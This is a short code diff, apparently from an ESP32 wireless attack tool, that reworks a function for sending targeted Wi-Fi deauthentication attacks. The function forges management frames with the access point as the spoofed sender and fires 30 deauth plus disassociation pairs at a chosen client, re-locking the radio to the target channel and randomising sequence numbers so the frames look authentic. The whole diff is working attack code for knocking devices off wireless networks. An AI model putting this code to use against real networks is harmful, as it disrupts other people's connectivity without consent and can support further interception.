@@ -14,6 +14,7 @@
 #include "input.h"
 #include "radio.h"
 #include "wifi_types.h"
+#include "wifi_deauth_frame.h"
 #include "ble_db.h"
 #include "dhcp_cache.h"
 #include <WiFi.h>
@@ -76,19 +77,18 @@ static void client_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     s_clients[idx].frames++;
 }
 
-/* Targeted deauth: AP → STA (client), spoofed sender = AP. */
+/* Targeted deauth: AP → STA (client), spoofed sender = AP.
+ * Fires 30 deauth+disassoc pairs = 60 frames at ~5ms spacing. */
 static void deauth_client(const uint8_t *client)
 {
-    uint8_t frame[26] = {
-        0xC0, 0x00, 0x00, 0x00,
-        client[0], client[1], client[2], client[3], client[4], client[5],
-        s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
-        s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
-        0x00, 0x00,
-        0x07, 0x00,
-    };
+    static uint16_t seq = 0;
+    if (seq == 0) seq = (uint16_t)(esp_random() & 0x0FFF);
+    /* Ensure we're on the right channel — wifi_clients keeps us locked
+     * to s_target_ch, but re-apply defensively in case another feature
+     * leaked a channel change via the hopper. */
+    esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < 30; ++i) {
-        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+        wifi_deauth_pair(client, s_target, &seq);
         delay(5);
     }
 }
